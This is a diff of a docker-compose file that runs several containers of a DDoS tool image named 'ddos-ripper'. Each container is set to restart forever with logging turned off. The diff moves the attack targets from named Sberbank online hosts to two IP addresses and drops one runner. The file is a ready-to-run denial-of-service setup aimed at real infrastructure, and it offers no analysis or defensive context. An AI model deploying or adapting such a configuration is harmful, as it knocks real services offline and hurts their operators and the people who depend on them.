@@ -3,18 +3,10 @@ services:
   ddos-runner-1:
     image: nitupkcuf/ddos-ripper:latest
     restart: always
-    command: stories-stat.online.sberbank.ru
+    command: 185.170.2.232
     logging:
       driver: none
   ddos-runner-2:
     image: nitupkcuf/ddos-ripper:latest
     restart: always
-    command: clickstream.online.sberbank.ru
-    logging:
-      driver: none
-  ddos-runner-3:
-    image: nitupkcuf/ddos-ripper:latest
-    restart: always
-    command: stat.online.sberbank.ru
-    logging:
-      driver: none
+    command: 185.170.2.231
